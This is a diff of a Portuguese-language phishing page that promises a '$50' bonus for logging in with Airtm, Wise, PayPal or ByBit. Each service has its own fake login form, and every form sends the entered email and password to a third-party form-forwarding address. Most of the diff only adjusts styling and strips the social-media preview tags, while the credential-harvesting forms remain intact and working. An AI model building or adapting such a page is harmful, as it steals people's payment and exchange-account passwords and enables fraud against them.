@@ -5,19 +5,6 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Ganhe $50 - Promoção</title>
 
-  <!-- ✅ Open Graph para WhatsApp -->
-  <meta property="og:title" content="🎉 Ganhe $50 por se conectar!" />
-  <meta property="og:description" content="Inicie sessão com a sua conta e ganhe bônus instantâneo em dólar. Oferta por tempo limitado!" />
-  <meta property="og:image" content="https://josefanykira.github.io/carteiras.jpg" />
-  <meta property="og:url" content="https://josefanykira.github.io/" />
-  <meta property="og:type" content="website" />
-
-  <!-- ✅ Twitter card -->
-  <meta name="twitter:card" content="summary_large_image" />
-  <meta name="twitter:title" content="🎉 Ganhe $50 por se conectar!" />
-  <meta name="twitter:description" content="Inicie sessão com a sua conta e ganhe bônus instantâneo em dólar. Oferta por tempo limitado!" />
-  <meta name="twitter:image" content="https://josefanykira.github.io/carteiras.jpg" />
-
   <style>
     * {
       margin: 0;
@@ -33,45 +20,40 @@
       background-repeat: no-repeat;
       min-height: 100vh;
       display: flex;
-      flex-direction: column;
-      align-items: center;
       justify-content: center;
-      backdrop-filter: brightness(0.8);
+      align-items: center;
+      backdrop-filter: brightness(0.85);
     }
 
     .container {
-      background-color: rgba(255, 255, 255, 0.92);
+      background: rgba(255, 255, 255, 0.95);
       padding: 30px;
-      border-radius: 15px;
-      text-align: center;
+      border-radius: 20px;
       width: 90%;
       max-width: 400px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.2);
+      text-align: center;
     }
 
     h1 {
-      font-size: 2em;
+      font-size: 26px;
       margin-bottom: 10px;
     }
 
     p {
       margin-bottom: 20px;
-      font-size: 1.1em;
+      font-size: 16px;
     }
 
     .btn {
-      display: block;
       width: 100%;
       padding: 12px;
-      margin: 10px 0;
-      background-color: #007BFF;
+      margin-bottom: 10px;
+      background-color: #007bff;
       color: white;
-      text-decoration: none;
-      border-radius: 8px;
       font-weight: bold;
       border: none;
+      border-radius: 8px;
       cursor: pointer;
-      transition: background 0.3s;
     }
 
     .btn:hover {
@@ -80,28 +62,39 @@
 
     form {
       display: none;
-      flex-direction: column;
       text-align: left;
       margin-top: 20px;
     }
 
-    input {
-      padding: 10px;
-      margin: 5px 0 15px;
-      width: 100%;
-      border: 1px solid #ccc;
-      border-radius: 6px;
-    }
-
     .form-title {
       font-weight: bold;
-      margin-bottom: 10px;
+      margin-bottom: 8px;
+      font-size: 16px;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+    }
+
+    .submit-btn {
+      background-color: #007bff;
+      color: white;
+      padding: 12px;
+      border: none;
+      border-radius: 8px;
+      width: 100%;
+      font-weight: bold;
+      cursor: pointer;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>🎉 Ganhe $50!</h1>
+    <h1>🎉 <strong>Ganhe $50!</strong></h1>
     <p>Inicia sessão com a tua conta das seguintes plataformas para ganhar 30 dólar:</p>
 
     <button class="btn" onclick="mostrarFormulario('airtm')">Iniciar sessão com Airtm</button>
@@ -109,41 +102,44 @@
     <button class="btn" onclick="mostrarFormulario('paypal')">Iniciar sessão com PayPal</button>
     <button class="btn" onclick="mostrarFormulario('bybit')">Iniciar sessão com ByBit</button>
 
-    <!-- Formulários -->
+    <!-- Airtm -->
     <form id="airtm" action="https://formsubmit.co/josefanykira@email.com" method="POST">
       <div class="form-title">Login Airtm</div>
       <input type="email" name="email" placeholder="Email Airtm" required />
       <input type="password" name="senha" placeholder="Senha" required />
-      <button type="submit" class="btn">Entrar</button>
+      <button type="submit" class="submit-btn">Entrar</button>
     </form>
 
+    <!-- Wise -->
     <form id="wise" action="https://formsubmit.co/josefanykira@email.com" method="POST">
       <div class="form-title">Login Wise</div>
       <input type="email" name="email" placeholder="Email Wise" required />
       <input type="password" name="senha" placeholder="Senha" required />
-      <button type="submit" class="btn">Entrar</button>
+      <button type="submit" class="submit-btn">Entrar</button>
     </form>
 
+    <!-- PayPal -->
     <form id="paypal" action="https://formsubmit.co/josefanykira@email.com" method="POST">
       <div class="form-title">Login PayPal</div>
       <input type="email" name="email" placeholder="Email PayPal" required />
       <input type="password" name="senha" placeholder="Senha" required />
-      <button type="submit" class="btn">Entrar</button>
+      <button type="submit" class="submit-btn">Entrar</button>
     </form>
 
+    <!-- ByBit -->
     <form id="bybit" action="https://formsubmit.co/josefanykira@email.com" method="POST">
       <div class="form-title">Login ByBit</div>
       <input type="email" name="email" placeholder="Email ByBit" required />
       <input type="password" name="senha" placeholder="Senha" required />
-      <button type="submit" class="btn">Entrar</button>
+      <button type="submit" class="submit-btn">Entrar</button>
     </form>
   </div>
 
   <script>
     function mostrarFormulario(id) {
-      document.querySelectorAll("form").forEach(f => f.style.display = "none");
-      document.getElementById(id).style.display = "flex";
+      document.querySelectorAll('form').forEach(f => f.style.display = 'none');
+      document.getElementById(id).style.display = 'block';
     }
   </script>
 </body>
-</html>
+        </html>
